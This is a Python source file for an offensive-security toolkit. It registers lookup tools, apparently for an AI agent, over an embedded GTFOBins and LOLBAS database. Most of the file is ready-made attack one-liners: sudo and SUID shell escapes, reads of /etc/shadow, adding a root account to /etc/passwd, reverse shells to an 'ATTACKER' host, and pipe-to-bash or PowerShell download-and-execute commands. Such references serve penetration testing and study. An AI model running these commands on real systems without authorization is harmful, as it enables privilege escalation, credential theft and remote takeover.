"""
DSEC GTFOBins Tool — Offline searchable GTFOBins database.

Inspired by: t0thkr1s/gtfobins-cli
Provides an offline lookup of Unix binaries that can be exploited for
privilege escalation, file read/write, reverse shells, etc.
"""
import json
import os
from typing import Dict, List, Optional

from dsec.core.registry import register

# ---------------------------------------------------------------------------
# Offline GTFOBins database (curated subset of most common binaries)
# Full database at: https://gtfobins.github.io/
# ---------------------------------------------------------------------------

_GTFOBINS_DB: Dict[str, Dict[str, List[str]]] = {
    "awk": {
        "shell": ["awk 'BEGIN {system(\"/bin/sh\")}'"],
        "suid": ["./awk 'BEGIN {system(\"/bin/sh\")}'"],
        "sudo": ["sudo awk 'BEGIN {system(\"/bin/sh\")}'"],
        "file_read": ["awk '//' <file>"],
    },
    "bash": {
        "shell": ["bash"],
        "suid": ["./bash -p"],
        "sudo": ["sudo bash"],
    },
    "cat": {
        "file_read": ["cat <file>"],
        "suid": ["./cat <file>"],
        "sudo": ["sudo cat <file>"],
    },
    "chmod": {
        "suid": ["./chmod 6777 /bin/bash && /bin/bash -p"],
        "sudo": ["sudo chmod 6777 /bin/bash && /bin/bash -p"],
    },
    "cp": {
        "file_write": ["cp /etc/passwd /tmp/passwd.bak && echo 'root2::0:0::/root:/bin/bash' >> /etc/passwd"],
        "suid": ["./cp /etc/shadow /tmp/shadow"],
        "sudo": ["sudo cp /bin/bash /tmp/bash && sudo chmod +s /tmp/bash"],
    },
    "curl": {
        "file_read": ["curl file:///etc/shadow"],
        "file_write": ["curl http://attacker/shell -o /tmp/shell"],
        "reverse_shell": ["curl http://attacker/shell | bash"],
        "sudo": ["sudo curl file:///etc/shadow"],
    },
    "docker": {
        "shell": ["docker run -v /:/host -it alpine chroot /host /bin/sh"],
        "sudo": ["sudo docker run -v /:/host -it alpine chroot /host /bin/sh"],
    },
    "ed": {
        "shell": ["ed\n!/bin/sh"],
        "sudo": ["sudo ed\n!/bin/sh"],
    },
    "env": {
        "shell": ["env /bin/sh"],
        "suid": ["./env /bin/sh -p"],
        "sudo": ["sudo env /bin/sh"],
    },
    "find": {
        "shell": ["find . -exec /bin/sh \\; -quit"],
        "suid": ["./find . -exec /bin/sh -p \\; -quit"],
        "sudo": ["sudo find . -exec /bin/sh \\; -quit"],
    },
    "ftp": {
        "shell": ["ftp\n!/bin/sh"],
        "sudo": ["sudo ftp\n!/bin/sh"],
    },
    "gcc": {
        "file_read": ["gcc -x c -E <file>"],
        "sudo": ["sudo gcc -wrapper /bin/sh,-s ."],
    },
    "git": {
        "shell": ["git help config\n!/bin/sh"],
        "sudo": ["sudo git -p help config\n!/bin/sh"],
    },
    "gdb": {
        "shell": ["gdb -nx -ex '!sh' -ex quit"],
        "sudo": ["sudo gdb -nx -ex '!sh' -ex quit"],
    },
    "less": {
        "shell": ["less /etc/passwd\n!/bin/sh"],
        "suid": ["./less /etc/shadow"],
        "sudo": ["sudo less /etc/passwd\n!/bin/sh"],
    },
    "lua": {
        "shell": ["lua -e 'os.execute(\"/bin/sh\")'"],
        "sudo": ["sudo lua -e 'os.execute(\"/bin/sh\")'"],
    },
    "man": {
        "shell": ["man man\n!/bin/sh"],
        "sudo": ["sudo man man\n!/bin/sh"],
    },
    "more": {
        "shell": ["more /etc/passwd\n!/bin/sh"],
        "sudo": ["sudo more /etc/passwd\n!/bin/sh"],
    },
    "mount": {
        "sudo": ["sudo mount -o bind /bin/sh /bin/mount && sudo mount"],
    },
    "nano": {
        "shell": ["nano\n^R^X\nreset; sh 1>&0 2>&0"],
        "sudo": ["sudo nano\n^R^X\nreset; sh 1>&0 2>&0"],
    },
    "nmap": {
        "shell": ["nmap --interactive\nnmap> !sh  # (nmap < 5.20)"],
        "sudo": ["TF=$(mktemp) && echo 'os.execute(\"/bin/sh\")' > $TF && sudo nmap --script=$TF"],
    },
    "node": {
        "shell": ["node -e 'child_process.spawn(\"/bin/sh\",{stdio:[0,1,2]})'"],
        "sudo": ["sudo node -e 'child_process.spawn(\"/bin/sh\",{stdio:[0,1,2]})'"],
        "reverse_shell": ["node -e '(function(){var net=require(\"net\"),c=net.connect(4444,\"ATTACKER\",function(){var sh=require(\"child_process\").spawn(\"/bin/sh\",[\"-i\"]);c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c);})})();'"],
    },
    "perl": {
        "shell": ["perl -e 'exec \"/bin/sh\";'"],
        "suid": ["./perl -e 'exec \"/bin/sh\";'"],
        "sudo": ["sudo perl -e 'exec \"/bin/sh\";'"],
        "reverse_shell": ["perl -e 'use Socket;$i=\"ATTACKER\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'"],
    },
    "php": {
        "shell": ["php -r 'system(\"/bin/sh\");'"],
        "sudo": ["sudo php -r 'system(\"/bin/sh\");'"],
        "reverse_shell": ["php -r '$s=fsockopen(\"ATTACKER\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"],
    },
    "pip": {
        "sudo": ["TF=$(mktemp -d) && echo 'import os;os.system(\"/bin/sh\")' > $TF/setup.py && sudo pip install $TF"],
    },
    "python": {
        "shell": ["python -c 'import os; os.system(\"/bin/sh\")'"],
        "suid": ["./python -c 'import os; os.execl(\"/bin/sh\",\"sh\",\"-p\")'"],
        "sudo": ["sudo python -c 'import os; os.system(\"/bin/sh\")'"],
        "reverse_shell": ["python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"ATTACKER\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"],
        "file_read": ["python -c 'print(open(\"<file>\").read())'"],
    },
    "ruby": {
        "shell": ["ruby -e 'exec \"/bin/sh\"'"],
        "sudo": ["sudo ruby -e 'exec \"/bin/sh\"'"],
        "reverse_shell": ["ruby -rsocket -e'f=TCPSocket.open(\"ATTACKER\",4444).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"],
    },
    "rsync": {
        "shell": ["rsync -e 'sh -c sh 0<&2 1>&2' 127.0.0.1:/dev/null"],
        "sudo": ["sudo rsync -e 'sh -c sh 0<&2 1>&2' 127.0.0.1:/dev/null"],
        "file_read": ["rsync <file> /tmp/"],
    },
    "scp": {
        "shell": ["TF=$(mktemp) && echo 'sh 0<&2 1>&2' > $TF && chmod +x $TF && scp -S $TF x y:"],
        "sudo": ["TF=$(mktemp) && echo 'sh 0<&2 1>&2' > $TF && chmod +x $TF && sudo scp -S $TF x y:"],
    },
    "sed": {
        "shell": ["sed -n '1e exec sh 1>&0' /etc/hosts"],
        "sudo": ["sudo sed -n '1e exec sh 1>&0' /etc/hosts"],
    },
    "socat": {
        "shell": ["socat stdin exec:/bin/sh"],
        "reverse_shell": ["socat tcp-connect:ATTACKER:4444 exec:/bin/sh,pty,stderr,setsid,sigint,sane"],
        "bind_shell": ["socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane"],
    },
    "ssh": {
        "shell": ["ssh -o ProxyCommand=';sh 0<&2 1>&2' x"],
        "sudo": ["sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x"],
    },
    "strace": {
        "shell": ["strace -o /dev/null /bin/sh"],
        "suid": ["./strace -o /dev/null /bin/sh -p"],
        "sudo": ["sudo strace -o /dev/null /bin/sh"],
    },
    "tar": {
        "shell": ["tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"],
        "sudo": ["sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"],
    },
    "tee": {
        "file_write": ["echo 'data' | tee <file>"],
        "sudo": ["echo 'root2::0:0::/root:/bin/bash' | sudo tee -a /etc/passwd"],
    },
    "vi": {
        "shell": ["vi -c ':!/bin/sh'"],
        "sudo": ["sudo vi -c ':!/bin/sh'"],
    },
    "vim": {
        "shell": ["vim -c ':!/bin/sh'"],
        "sudo": ["sudo vim -c ':!/bin/sh'"],
        "file_read": ["vim <file>"],
    },
    "watch": {
        "shell": ["watch -x sh -c 'reset; exec sh 1>&0 2>&0'"],
        "sudo": ["sudo watch -x sh -c 'reset; exec sh 1>&0 2>&0'"],
    },
    "wget": {
        "file_read": ["wget -q -O- file:///etc/shadow"],
        "file_write": ["wget http://attacker/shell -O /tmp/shell"],
        "sudo": ["sudo wget -q -O- file:///etc/shadow"],
    },
    "zip": {
        "shell": ["TF=$(mktemp -u) && zip $TF /etc/hosts -T -TT 'sh #'"],
        "sudo": ["TF=$(mktemp -u) && sudo zip $TF /etc/hosts -T -TT 'sh #'"],
    },
}

_LOLBAS_DB: Dict[str, Dict[str, List[str]]] = {
    "certutil.exe": {
        "download": ["certutil.exe -urlcache -f http://attacker/file file"],
        "encode": ["certutil.exe -encode input output"],
        "decode": ["certutil.exe -decode input output"],
    },
    "bitsadmin.exe": {
        "download": ["bitsadmin /transfer job http://attacker/file %cd%\\file"],
    },
    "powershell.exe": {
        "download": ["powershell -Command \"(New-Object Net.WebClient).DownloadFile('http://attacker/file', 'file')\""],
        "execute": ["powershell -Command \"IEX (New-Object Net.WebClient).DownloadString('http://attacker/script.ps1')\""],
    },
    "regsvr32.exe": {
        "execute": ["regsvr32 /s /n /u /i:http://attacker/file.sct scrobj.dll"],
    },
    "mshta.exe": {
        "execute": ["mshta http://attacker/file.hta"],
    },
}


# ---------------------------------------------------------------------------
# Registered Tools
# ---------------------------------------------------------------------------

@register("gtfobins_search", "Search for GTFOBins exploitation commands for a specific binary (e.g., find, vim, nmap). Returns SUID, Sudo, and Shell escape vectors.", roles=("brain", "research"))
def gtfobins_search(binary: str) -> str:
    """Search the GTFOBins database for exploitation techniques."""
    binary = binary.strip().lower()
    
    # Direct match
    if binary in _GTFOBINS_DB:
        entry = _GTFOBINS_DB[binary]
        lines = [f"GTFOBins: {binary}"]
        lines.append("=" * 40)
        for category, commands in entry.items():
            lines.append(f"\n[{category.upper()}]")
            for cmd in commands:
                lines.append(f"  $ {cmd}")
        return "\n".join(lines)
    
    # LOLBAS match
    if binary in _LOLBAS_DB or binary + ".exe" in _LOLBAS_DB:
        key = binary if binary in _LOLBAS_DB else binary + ".exe"
        entry = _LOLBAS_DB[key]
        lines = [f"LOLBAS: {key}"]
        lines.append("=" * 40)
        for category, commands in entry.items():
            lines.append(f"\n[{category.upper()}]")
            for cmd in commands:
                lines.append(f"  $ {cmd}")
        return "\n".join(lines)

    # Fuzzy search
    matches = [b for b in _GTFOBINS_DB if binary in b or b in binary]
    matches += [b for b in _LOLBAS_DB if binary in b or b in binary]
    if matches:
        lines = [f"No exact match for '{binary}'. Similar binaries:"]
        for m in matches[:5]:
            db = _GTFOBINS_DB if m in _GTFOBINS_DB else _LOLBAS_DB
            cats = ", ".join(db[m].keys())
            lines.append(f"  • {m} ({cats})")
        return "\n".join(lines)
    
    return f"No GTFOBins entry found for '{binary}'. Try common binaries like: python, vim, find, nmap, docker, tar, etc."


@register("gtfobins_list", "List all available GTFOBins entries, optionally filtered by exploitation category (shell, suid, sudo, reverse_shell, file_read, file_write).", roles=("brain", "research"))
def gtfobins_list(category: str = "") -> str:
    """List GTFOBins entries, optionally filtered by category."""
    category = category.strip().lower()
    
    if not category:
        # List all binaries with their categories
        lines = [f"GTFOBins Database: {len(_GTFOBINS_DB)} binaries"]
        lines.append("=" * 50)
        for binary in sorted(_GTFOBINS_DB.keys()):
            cats = ", ".join(sorted(_GTFOBINS_DB[binary].keys()))
            lines.append(f"  {binary:15s}  {cats}")
        return "\n".join(lines)
    
    # Filter by category
    valid_cats = {"shell", "suid", "sudo", "file_read", "file_write", "reverse_shell", "bind_shell"}
    if category not in valid_cats:
        return f"Invalid category '{category}'. Valid: {', '.join(sorted(valid_cats))}"
    
    matches = [b for b in sorted(_GTFOBINS_DB) if category in _GTFOBINS_DB[b]]
    if not matches:
        return f"No binaries found with category '{category}'."
    
    lines = [f"GTFOBins with [{category.upper()}] ({len(matches)} binaries):"]
    for b in matches:
        cmd = _GTFOBINS_DB[b][category][0][:80]
        lines.append(f"  {b:15s}  {cmd}")
    return "\n".join(lines)
